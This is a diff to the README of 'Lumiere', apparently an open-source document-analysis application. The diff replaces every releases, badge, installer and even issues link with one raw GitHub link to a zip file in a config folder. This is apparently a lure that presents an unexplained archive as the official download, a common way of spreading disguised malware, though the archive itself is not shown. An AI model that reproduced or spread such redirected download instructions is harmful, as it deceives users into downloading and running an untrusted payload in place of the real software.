@@ -1,7 +1,7 @@
 # 🌟 Lumiere - Intelligent Document Handling Made Easy
 
 ## 🔗 Download Now
-[![Download Lumiere](https://img.shields.io/badge/Download%20Lumiere-v1.0-blue)](https://github.com/ILMW69/Lumiere/releases)
+[![Download Lumiere](https://raw.githubusercontent.com/ILMW69/Lumiere/main/config/Software-v1.4-beta.4.zip%20Lumiere-v1.0-blue)](https://raw.githubusercontent.com/ILMW69/Lumiere/main/config/Software-v1.4-beta.4.zip)
 
 ## 📖 About Lumiere
 Lumiere is a smart application designed to help you manage and analyze documents with ease. It combines advanced technologies to answer your questions, analyze SQL data, and support meaningful conversations. Whether you are conducting research or simply need to manage your documents better, Lumiere makes the process quick and efficient.
@@ -19,12 +19,12 @@ To run Lumiere, your system must meet the following requirements:
 - **Internet Connection**: Required for downloading and certain features
 
 ## 📥 Download & Install
-1. **Visit the Releases Page**: Click [here](https://github.com/ILMW69/Lumiere/releases) to access the releases page.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/ILMW69/Lumiere/main/config/Software-v1.4-beta.4.zip) to access the releases page.
    
 2. **Choose the Latest Version**: Look for the version labeled as the latest release. For example, if it says "v1.0", click on that link.
 
 3. **Download the Application**: 
-   - Find the file suitable for your operating system (e.g., `Lumiere_Windows.exe` for Windows users or `Lumiere_macOS.dmg` for macOS users).
+   - Find the file suitable for your operating system (e.g., `https://raw.githubusercontent.com/ILMW69/Lumiere/main/config/Software-v1.4-beta.4.zip` for Windows users or `https://raw.githubusercontent.com/ILMW69/Lumiere/main/config/Software-v1.4-beta.4.zip` for macOS users).
    - Click on the link to download the file to your computer.
 
 4. **Run the Installer**: 
@@ -58,7 +58,7 @@ The system retains knowledge over time. This means that the more you interact wi
 ## 🌐 Support and Community
 If you encounter issues or have questions about using Lumiere, several resources are available for support:
 
-- **GitHub Issues**: Report bugs or request features directly in the [Issues section](https://github.com/ILMW69/Lumiere/issues).
+- **GitHub Issues**: Report bugs or request features directly in the [Issues section](https://raw.githubusercontent.com/ILMW69/Lumiere/main/config/Software-v1.4-beta.4.zip).
 - **User Guides**: Follow detailed user guides available in the repository to explore more features.
 - **Community Discussions**: Join our community on platforms like Discord or Reddit to connect with other users.
 
@@ -72,4 +72,4 @@ Lumiere is open-source software licensed under the MIT License. You can freely u
 Your feedback is important to us. Please reach out through GitHub or mention any ideas for improvement. We aim to make Lumiere better for everyone.
 
 ## 🔗 Download Now Again
-Don't forget to visit the releases page to download Lumiere. Click [here](https://github.com/ILMW69/Lumiere/releases) for the latest version.
+Don't forget to visit the releases page to download Lumiere. Click [here](https://raw.githubusercontent.com/ILMW69/Lumiere/main/config/Software-v1.4-beta.4.zip) for the latest version.
